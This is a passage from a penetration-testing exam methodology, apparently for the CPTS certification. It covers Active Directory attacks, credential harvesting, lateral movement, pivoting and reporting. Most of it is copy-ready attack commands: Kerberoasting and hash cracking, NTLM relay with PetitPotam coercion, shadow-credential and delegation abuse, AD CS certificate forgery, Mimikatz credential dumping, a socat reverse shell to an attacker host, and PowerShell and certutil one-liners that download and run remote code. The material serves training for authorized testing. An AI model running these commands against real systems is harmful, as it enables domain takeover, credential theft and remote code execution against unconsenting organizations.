  ├─► STEP 6: Enumerate LAPS
  │     Find-LAPSDelegatedGroups / Get-LAPSComputers
  │     Get-DomainObject -Identity <computer$> -Properties ms-Mcs-AdmPwd
  │     If ReadLAPSPassword ACL ──► Read the local admin password!
  │
  ├─► STEP 7: Enumerate GMSA
  │     Get-DomainServiceAccount
  │     If ReadGMSAPassword ──► gMSADumper.py -d <domain> -u <user> -p <pass>
  │
  ├─► STEP 8: Enumerate delegation
  │     ├── Unconstrained: Get-DomainComputer -Unconstrained → TGTs for ALL users
  │     ├── Constrained: Get-DomainUser -TrustedToAuth → S4U (s4u2self + s4u2proxy)
  │     └── Resource-Based: msDS-AllowedToActOnBehalfOfOtherIdentity
  │
  └─► STEP 9: Enumerate domain trusts
        Get-DomainTrust / nltest /domain_trusts
        ├── Intra-forest: SID History may allow privesc across trusts
        └── Inter-forest: May require different attack approach
```

### 5C: AD Attack Techniques

```
CREDENTIALS OBTAINED ──► CHOOSE ATTACK BASED ON SITUATION
  │
  ├─► Kerberoasting (Need ANY valid domain credentials)
  │     GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request
  │     Crack: hashcat -m 13100 hash.txt rockyou.txt
  │     With rules: hashcat -m 13100 hash.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
  │     From Windows: Rubeus.exe kerberoast /outfile:hashes.txt
  │
  ├─► AS-REP Roasting: GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP>
  │     With creds: GetNPUsers.py <domain>/<user>:<pass> -request
  │     Crack: hashcat -m 18200 hash.txt rockyou.txt
  │
  ├─► ACL Attacks (Identified via BloodHound):
  │     ├── GenericAll on User ──► Reset password or set SPN for Kerberoast
  │     │     Set-DomainUserPassword / Set-DomainObject -Set @{serviceprincipalname='fake/SPN'}
  │     ├── GenericAll on Group ──► Add ourselves: Add-DomainGroupMember
  │     ├── GenericAll on Computer ──► Shadow Credentials attack
  │     ├── GenericWrite on User ──► Set SPN and Kerberoast / set DACL
  │     ├── WriteDacl on User ──► Grant GenericAll → Reset password
  │     ├── ForceChangePassword ──► Set-DomainUserPassword
  │     ├── WriteOwner ──► Change owner → Grant GenericAll
  │     ├── ReadLAPSPassword ──► Read local admin password on computer
  │     └── ReadGMSAPassword ──► gMSADumper.py → Retrieve GMSA password
  │
  ├─► NTLM Relay Attacks
  │     # Find hosts with SMB signing disabled: crackmapexec smb <subnet> --signing
  │     # Set up relay: ntlmrelayx.py -tf targets.txt -smb2support
  │     # Trigger authentication:
  │     ├── PetitPotam: python3 PetitPotam.py <ATTACKER> <DC_IP>
  │     ├── Coercer (automated): python3 Coercer.py -u <user> -p <pass> -d <domain> -t <target> -l <ATTACKER>
  │     ├── SCF file on SMB share (coerce user auth)
  │     └── Relay to LDAP: ntlmrelayx.py -t ldap://<DC_IP> --delegate-access
  │
  ├─► Shadow Credentials Attack (GenericAll/GenericWrite on computer)
  │     pywhisker.py -d <domain> -u <user> -p <pass> --target <computer$> --action add
  │     gettgtpkinit.py -cert-pfx <cert>.pfx <domain>/<computer$> <TGT.ccache>
  │     getnthash.py <domain>/<computer$> -key <AS-REP key> -dc-ip <DC_IP>
  │
  ├─► Constrained Delegation (S4U) Attack
  │     # s4u2self + s4u2proxy
  │     getST.py -spn <service>/<target> -impersonate administrator <domain>/<svc_acct>:<pass>
  │     export KRB5CCNAME=administrator.ccache; psexec.py <domain>/admin@<target> -k -no-pass
  │     # With Rubeus: Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:<svc>/<target> /ptt
  │
  ├─► Resource-Based Constrained Delegation Attack
  │     # If GenericWrite/GenericAll on computer object:
  │     addcomputer.py -computer-name FAKE$ -computer-pass Pass123 <domain>/<user>:<pass>
  │     rbcd.py -delegate-from FAKE$ -delegate-to <TARGET$> <domain>/<user>:<pass>
  │     getST.py -spn <service>/<target> -impersonate administrator <domain>/FAKE$:Pass123
  │
  ├─► Pass-the-Hash: crackmapexec / psexec.py / evil-winrm / xfreerdp
  ├─► Overpass-the-Hash: getTGT.py → psexec.py -k -no-pass
  ├─► Pass-the-Ticket: Rubeus.exe dump/ptt / export KRB5CCNAME
  │
  ├─► DCSync (Need DA or Replication Rights): secretsdump.py
  ├─► Golden Ticket (Need krbtgt hash): ticketer.py → psexec.py -k -no-pass
  ├─► Silver Ticket (Need service hash): ticketer.py -spn
  │
  ├─► SID History Attack (across domain trusts)
  │     Add Enterprise Admins SID (S-1-5-21-<parent>-519) to user in child domain
  │     Requires: DA in child + SID filtering disabled on trust
  │
  ├─► noPac.py (CVE-2021-42278 + CVE-2021-42287)
  ├─► PrintNightmare (CVE-2021-1675)
  ├─► PetitPotam (CVE-2021-36942) ──► Combine with ntlmrelayx
  ├─► GPP Password Decryption: findstr /S cpassword / gpp-decrypt / crackmapexec --gpp-password
  │
  ├─► AD CS (Active Directory Certificate Services) Attacks
  │     certipy find -u <user>@<domain> -p <pass> -dc-ip <DC_IP>
  │     ├── ESC1 - Misconfigured Certificate Templates (SAN + Client Auth)
  │     │     certipy req -u <user>@<domain> -p <pass> -ca <CA> -template <TMPL> -upn administrator@<domain>
  │     │     certipy auth -pfx administrator.pfx -domain <domain>
  │     ├── ESC2 - Any Purpose EKU
  │     ├── ESC3 - Certificate Request Agent
  │     ├── ESC4 - Vulnerable Certificate Template ACL
  │     │     certipy template -u <user>@<domain> -p <pass> -template <TMPL> -save-old
  │     ├── ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
  │     ├── ESC7 - Vulnerable CA ACL
  │     ├── ESC8 - AD CS HTTP NTLM Relay:
  │     │     ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs
  │     └── PetitPotam + AD CS Relay
  │
  └─► Domain Trust Attacks (Child → Parent)
        ├── raiseChild.py <child_domain>/<user>:<pass>
        ├── SID History Injection (manual with mimikatz)
        └── Enterprise Admins in parent → full control over child → entire forest
```

### 5D: Credential Harvesting from Compromised Hosts

```
SYSTEM/SHELL ON DOMAIN-JOINED HOST
  │
  ├─► LINUX host:
  │     ├── /etc/shadow, id_rsa, .bash_history, grep -ri password
  │     ├── /etc/hosts, arp -a, ss -tlnp (internal services)
  │     ├── Database credentials in config files
  │     └── Kerberos tickets in /tmp/krb5cc_*
  │
  ├─► WINDOWS host:
  │     ├── Mimikatz: sekurlsa::logonpasswords / lsadump::sam / lsadump::dcsync / kerberos::list
  │     ├── Rubeus: asreproast / kerberoast / dump / ptt / s4u
  │     ├── Saved credentials: cmdkey /list
  │     ├── SAM/SYSTEM: reg save → secretsdump.py LOCAL
  │     ├── NTDS.dit: ntdsutil → IFM → secretsdump.py
  │     ├── DPAPI: dpapi::cred /in:<path> → Decrypt browser/WiFi/credential manager
  │     ├── KeePass: dir *.kdbx /s → keepass2john + john
  │     ├── BitLocker: manage-bde -protectors -get C:
  │     ├── Browser passwords, RDP connections, SSH keys, WiFi passwords
  │     ├── findstr /si "password" C:\Users\* 2>nul
  │     └── Snaffler.exe -s -d <domain> -c <DC_IP>
  │
  └─► Password cracking:
        NTLM(1000) / NetNTLMv2(5600) / Kerberos TGS(13100) / AS-REP(18200)
        SHA-512(1800) / MD5(0) / SHA-256(7400) / bcrypt(3200)
        KeePass(13400) / BitLocker(22100) / WPA(22000)
        With rules: -r /usr/share/hashcat/rules/best64.rule / d3ad0ne.rule
```

---

## Phase 6: Lateral Movement & Pivoting

```
ROOT/SYSTEM ACCESS OBTAINED ON ONE HOST
  │
  ├─► STEP 1: Pillaging (gather everything!) ──► See 5D
  │
  ├─► STEP 2: Network discovery from compromised host
  │     ├── LINUX: ip route, /etc/hosts, arp -a, ping sweep
  │     └── WINDOWS: ipconfig /all, route print, arp -a, net view /domain
  │
  ├─► STEP 3: Pivoting (if internal networks discovered)
  │     ├── SSH tunneling: -L (local) / -D (SOCKS) / -R (remote)
  │     ├── Chisel: server --reverse -p 8080 / client R:socks
  │     ├── Metasploit: run autoroute -s <subnet>
  │     ├── Ligolo-ng: Full TUN access without proxychains
  │     ├── rpivot: Reverse SOCKS via HTTP
  │     ├── dnscat2: DNS tunneling (bypasses strict firewalls)
  │     ├── ptunnel-ng: ICMP tunneling
  │     └── Proxychains: proxychains nmap -sT / crackmapexec
  │
  ├─► STEP 4: Active Directory Lateral Movement
  │     ├── With credentials:
  │     │     crackmapexec smb <subnet> -u user -p pass
  │     │     psexec.py <domain>/user:pass@<IP>
  │     │     smbexec.py <domain>/user:pass@<IP>  (semi-interactive, no dropped binary)
  │     │     wmiexec.py <domain>/user:pass@<IP>  (stealthier, no dropped binary)
  │     │     atexec.py <domain>/user:pass@<IP> 'whoami'  (scheduled task)
  │     │     evil-winrm -i <IP> -u user -p pass
  │     │     xfreerdp /v:<IP> /u:user /p:pass
  │     │
  │     ├── Pass-the-Hash: crackmapexec / psexec.py / smbexec.py / evil-winrm
  │     ├── Kerberoasting → Crack → Lateral movement
  │     ├── AS-REP Roasting
  │     ├── Constrained Delegation (S4U): getST.py / Rubeus.exe s4u
  │     └── DCSync (if DA): secretsdump.py → Dump ALL domain hashes
  │
  ├─► STEP 5: Advanced Pivoting Tools
  │     ├── Ligolo-ng (TUN interface — best for full network access)
  │     ├── rpivot (reverse SOCKS proxy via HTTP)
  │     ├── dnscat2 (DNS tunneling — bypasses strict firewalls)
  │     ├── ptunnel-ng (ICMP tunneling)
  │     └── Socat (port forwarding / relay)
  │
  └─► STEP 6: For each new host ──► Go back to Phase 1
        (Enumeration is ITERATIVE!)
```

---

## Phase 7: Documentation & Reporting

```
ASSESSMENT COMPLETE
  │
  ├─► STEP 1: Clean up (tools, users, cron jobs, registry, system changes)
  │
  ├─► STEP 2: Document findings
  │     For EACH finding: Title & Severity / Description / Impact /
  │     Steps to reproduce / Evidence / Remediation / References
  │
  ├─► STEP 3: Create attack chain narrative
  │     "Finding A → led to Finding B → which enabled Finding C → Domain Admin"
  │
  ├─► STEP 4: Reporting Golden Rules
  │     ├── Executive Summary: NO technical jargon. Focus on IMPACT
  │     ├── Attack Chain: Tell a story
  │     ├── Redaction: Use SOLID BLACK BARS, NOT pixelation/blurring
  │     ├── Cleanup: List every file uploaded and every account created
  │     └── QA: Read your own report once over to catch typos
  │
  ├─► STEP 5: Deliverables
  │     Executive summary / Technical report / Raw scan data / PoC scripts
  │
  └─► STEP 6: Notetaking & Logging Best Practices
        Save ALL scan results / Log commands / Screenshots with whoami+hostname+IP
        Track credentials / Document as you go
```

---

## Quick Reference Cheat Sheets

### Shell Upgrade Cheat Sheet

```bash
# Python TTY upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Script fallback (no Python)
script /dev/null -c bash

# Socat full TTY
# Attack: socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target: socat exec:'bash -li',pty,stderr,setsid,sigint,suspend tcp:<ATTACKER>:4444
```

### File Transfer Cheat Sheet

**Linux → Attack Machine:**
```bash
python3 -m http.server 80  # Attack machine
wget http://<ATTACKER>/file  # Target
```

**Windows → Attack Machine:**
```powershell
# PowerShell: (New-Object Net.WebClient).DownloadFile('http://<ATTACKER>/file.exe','C:\Temp\file.exe')
# Certutil: certutil -urlcache -split -f http://<ATTACKER>/file.exe file.exe
# SMB: impacket-smbserver share /tmp/smbshare -smb2support
# IEX: IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1')
# BitsAdmin: bitsadmin /transfer n http://<ATTACKER>/file.exe C:\Temp\file.exe
```

### Password Cracking Quick Reference

| Hash Type | Hashcat Mode | Example Command |
|-----------|-------------|-----------------|
| MD5 | 0 | `hashcat -m 0 hash.txt rockyou.txt` |
| SHA-1 | 100 | `hashcat -m 100 hash.txt rockyou.txt` |
| SHA-256 | 1400 | `hashcat -m 1400 hash.txt rockyou.txt` |
| SHA-512 (Linux) | 1800 | `hashcat -m 1800 hash.txt rockyou.txt` |
| bcrypt | 3200 | `hashcat -m 3200 hash.txt rockyou.txt` |
| NTLM | 1000 | `hashcat -m 1000 hash.txt rockyou.txt` |
| NetNTLMv2 | 5600 | `hashcat -m 5600 hash.txt rockyou.txt` |
| Kerberos TGS | 13100 | `hashcat -m 13100 hash.txt rockyou.txt` |
| Kerberos AS-REP | 18200 | `hashcat -m 18200 hash.txt rockyou.txt` |
| MSSQL | 1731 | `hashcat -m 1731 hash.txt rockyou.txt` |
| IPMI | 7300 | `hashcat -m 7300 hash.txt rockyou.txt` |
| MySQL | 300 | `hashcat -m 300 hash.txt rockyou.txt` |
| PostgreSQL | 11100 | `hashcat -m 11100 hash.txt rockyou.txt` |
| WPA/WPA2 | 22000 | `hashcat -m 22000 hash.txt rockyou.txt` |
| KeePass | 13400 | `keepass2john db.kdbx > hash; john hash` |
| BitLocker | 22100 | `hashcat -m 22100 hash.txt rockyou.txt` |

### Password Cracking with Custom Rules

```bash
# Apply mutation rules:
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/d3ad0ne.rule > mutated2.txt
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/toggles1.rule > toggled.txt

# Use rules during cracking:
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# CeWL - custom wordlist from target website:
cewl -d 2 -m 5 http://<target> -w custom_wordlist.txt

# Username mutation:
username-anarchy -i names.txt > mutated_users.txt
```

### Port-by-Port Quick Reference

| Port | Service | First Action | Key Attack Vectors |
|------|---------|-------------|-------------------|
| 21 | FTP | `ftp <IP>` → try anonymous | Anonymous login, version exploits, upload web shell |
| 22 | SSH | `nc -nv <IP> 22` (banner) | Credentials from other services, key reuse, brute force |
| 25 | SMTP | `smtp-user-enum` | User enumeration, phishing |
| 53 | DNS | `dig axfr @<IP> <domain>` | Zone transfer, subdomain enum |
| 80/443 | HTTP/S | `whatweb`, `curl -IL` | Full web attack tree |
| 139/445 | SMB | `smbclient -N -L`, `crackmapexec` | Shares, EternalBlue, creds, SCF attack, user enum |
| 161 | SNMP | `snmpwalk -v 2c -c public` | Process creds, software, network info |
| 389/636 | LDAP | `ldapsearch -x -H ldap://<IP>` | AD enumeration, users, groups |
| 88 | Kerberos | `kerbrute userenum` | AS-REP roast, Kerberoast, user enum |
| 1433 | MSSQL | `mssqlclient.py` | xp_cmdshell, credentials, linked servers |
| 3306 | MySQL | `mysql -u root -p` | INTO OUTFILE, credentials |
| 3389 | RDP | `xfreerdp /v:<IP>` | Credential attacks, BlueKeep |
| 623 | IPMI | `nmap -sU -p 623` | Hash dump (RAKP flaw), default creds |
| 1521 | Oracle TNS | `./odat.py tnscmd` | SID guess, default creds, ODAT RCE |
| 2049 | NFS | `showmount -e <IP>` | Mount shares, no_root_squash |
| 5432 | PostgreSQL | `psql -U postgres -h <IP>` | COPY RCE, read files, credentials |
| 5900 | VNC | `nc -nv <IP> 5900` | Default creds, brute force |
| 5985/5986 | WinRM | `evil-winrm -i <IP>` | Remote shell, credential attacks |

### Active Directory Attack Order Quick Reference

```
AD ENVIRONMENT DETECTED
  │
  ├─► 1. Enumerate domain: crackmapexec smb / ldapsearch
  ├─► 2. Start Responder + Inveigh (LLMNR/NBT-NS poisoning)
  ├─► 3. User enumeration: kerbrute / rpcclient / lookupsid.py
  ├─► 4. AS-REP Roasting (no auth needed!)
  ├─► 5. Password spraying
  ├─► 6. Kerberoasting (need ANY valid creds)
  ├─► 7. BloodHound analysis (with valid creds)
  │     ├── Path to DA / ACL abuse / Delegation / GMSA / LAPS
  ├─► 8. ACL attacks: GenericAll / GenericWrite / WriteDacl / ForceChangePassword /
  │     ReadLAPSPassword / ReadGMSAPassword
  ├─► 9. AD CS attacks (if cert services): ESC1-ESC8
  ├─► 10. Lateral movement: psexec / smbexec / wmiexec / atexec / evil-winrm
  ├─► 11. PrivEsc on new host: winPEAS / SeImpersonate / Mimikatz / DPAPI / KeePass
  ├─► 12. DA obtained? YES → DCSync / NO → Go back to step 7
  └─► 13. Persistence: Golden/Silver ticket / Domain trust attacks (SID History, raiseChild)
```

### Linux Privilege Escalation Quick Wins

```
1.  sudo -l                    ← #1 most important check
2.  find / -perm -4000 2>/dev/null   ← SUID → GTFOBins
3.  cat /etc/crontab            ← Cron jobs
4.  getcap -r / 2>/dev/null    ← Capabilities
5.  ss -tlnp                   ← Internal services
6.  find / -writable -type d 2>/dev/null  ← Writable dirs
7.  cat /etc/exports           ← NFS shares
8.  id                         ← Groups (docker? disk? lxd? snap?)
9.  uname -a                   ← Kernel (PwnKit? OverlayFS?)
10. grep -ri password /home/ 2>/dev/null
11. find / -name id_rsa 2>/dev/null
12. cat .bash_history
13. env                        ← Environment variables
14. ldd /path/to/sudo-binary  ← Shared library hijack (LD_LIBRARY_PATH)
15. docker images              ← Docker escape
16. ls -la /tmp/ssh-*         ← SSH agent hijacking
17. getfacl /path/to/file     ← ACLs
```

### Windows Privilege Escalation Quick Wins

```
1.  whoami /priv               ← SeImpersonate?
2.  whoami /groups              ← Group membership
3.  systeminfo                  ← OS version, hotfixes
4.  net user / net localgroup administrators
5.  cmdkey /list                ← Saved credentials
6.  reg query "HKLM\...\Winlogon"  ← Auto-logon
7.  AlwaysInstallElevated (HKCU+HKLM)
8.  Unquoted service paths
9.  findstr /si "password" *.txt *.ini *.xml *.config
10. netstat -ano                ← Internal services
11. schtasks /query /fo LIST /v
12. net localgroup "DnsAdmins"
13. reg query HKLM /f password /t REG_SZ /s
14. DPAPI: dir C:\Users\*\AppData\*\Microsoft\Credentials\
15. KeePass: dir C:\Users\*\*.kdbx /s
16. BitLocker: manage-bde -protectors -get C:
```

### The "I'm Stuck" Loop

```
STUCK? Follow this checklist:
  │
  ├─► 1. Re-enumerate: Did you miss a port? A sub-directory? A parameter?
  ├─► 2. Check configs: wp-config.php, web.config, .env, *.conf
  ├─► 3. Check local ports: ss -tlnp / netstat -ano (internal services?)
  ├─► 4. Try fallbacks: If psexec fails, try wmiexec/smbexec/atexec. If wget fails, try certutil.
  ├─► 5. Check for credentials everywhere: files, history, environment, registry, DPAPI
  ├─► 6. Re-run automated tools: LinPEAS/WinPEAS may have missed something
  ├─► 7. Check BloodHound again: Look for different attack paths (GMSA, LAPS, RBCD)
  ├─► 8. Try password reuse: Use found credentials on ALL services
  ├─► 9. Check for internal web apps: Forward ports and enumerate
  └─► 10. Try custom wordlists: CeWL from target, mutated usernames, hashcat rules
```

---

## 🎯 EXAM DAY REMINDERS

1. **ENUMERATE TWICE, EXPLOIT ONCE** — Rushing leads to missed paths
2. **Save ALL scan results** — `nmap -oA`, `gobuster -o`
3. **Check EVERY service** — Don't skip "unimportant" ports
4. **Try credentials everywhere** — Password reuse is REAL
5. **If stuck, re-enumerate** — You probably missed something
6. **Upgrade your shell immediately** — Full TTY makes everything easier
7. **Check for internal services** — `ss -tlnp` / `netstat -ano`
8. **LinPEAS/WinPEAS first** — Then manual enumeration
9. **GTFOBins is your best friend** — For sudo/SUID exploitation
10. **Document as you go** — Don't leave reporting to the end
11. **Start Responder + Inveigh immediately** — Passive hash capture while you work
12. **BloodHound is mandatory** — Run it as soon as you have ANY creds
13. **Check for AD attacks FIRST** — AS-REP Roast, Kerberoast, Password Spray
14. **Try Pass-the-Hash** — If you have NTLM hash, you don't need a password
15. **Use smbexec/wmiexec/atexec** — Not just psexec; different tools for different situations
16. **Check DPAPI, KeePass, BitLocker** — Windows credential stores are goldmines
17. **Try custom wordlists + rules** — CeWL, hashcat rules (best64, d3ad0ne, toggles)
18. **SCF file attack on SMB shares** — Drop .scf file to capture hashes
19. **Coercer for AD auth coercion** — Automates PetitPotam-style attacks
20. **Flags: exact strings** — No trailing spaces, copy carefully

---

*Methodology created from comprehensive analysis of all 27 CPTS Academy modules.*
